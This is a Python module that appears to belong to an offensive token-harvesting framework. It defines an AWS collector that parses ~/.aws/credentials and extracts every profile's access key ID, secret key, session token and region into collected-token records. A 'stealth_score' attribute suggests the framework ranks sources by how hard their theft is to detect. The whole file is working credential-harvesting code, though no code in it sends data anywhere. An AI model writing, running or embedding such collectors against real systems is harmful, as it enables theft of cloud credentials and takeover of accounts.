"""AWS credentials file parser — reads ~/.aws/credentials using stdlib configparser."""

from __future__ import annotations

import configparser
from typing import List

from ..base import BaseCollector
from .. import CollectorRegistry
from ...types import CollectedToken, DiscoveredToken
from ...secure import secure
from ...platform_utils import aws_dir


@CollectorRegistry.register
class AwsCredentialsCollector(BaseCollector):
    service = "aws"
    source = "credentials"
    stealth_score = 5

    def _credentials_path(self):
        return aws_dir() / "credentials"

    def discover(self) -> List[DiscoveredToken]:
        results = []
        path = self._credentials_path()
        if not path.exists():
            return results

        try:
            config = configparser.ConfigParser()
            config.read(str(path))

            for section in config.sections():
                if config.has_option(section, "aws_access_key_id"):
                    results.append(DiscoveredToken(
                        service=self.service,
                        source=self.source,
                        path=str(path),
                        account_hint=f"profile:{section}",
                        stealth_score=self.stealth_score,
                        details=f"key_id={config.get(section, 'aws_access_key_id', fallback='?')[:8]}...",
                    ))
        except Exception as e:
            self._warn(f"Failed to parse {path}: {e}")

        return results

    def collect(self) -> List[CollectedToken]:
        results = []
        path = self._credentials_path()
        if not path.exists():
            return results

        try:
            config = configparser.ConfigParser()
            config.read(str(path))

            for section in config.sections():
                key_id = config.get(section, "aws_access_key_id", fallback=None)
                secret = config.get(section, "aws_secret_access_key", fallback=None)
                session = config.get(section, "aws_session_token", fallback=None)

                if not key_id or not secret:
                    continue

                extra = {"profile": section}
                if session:
                    extra["session_token"] = session

                region = config.get(section, "region", fallback=None)
                if region:
                    extra["region"] = region

                results.append(CollectedToken(
                    service=self.service,
                    source=self.source,
                    stealth_score=self.stealth_score,
                    account_id=key_id,
                    username=f"profile:{section}",
                    access_token=secure(key_id),
                    client_secret=secure(secret),
                    extra=extra,
                ))
        except Exception as e:
            self._warn(f"Failed to collect from {path}: {e}")

        return results
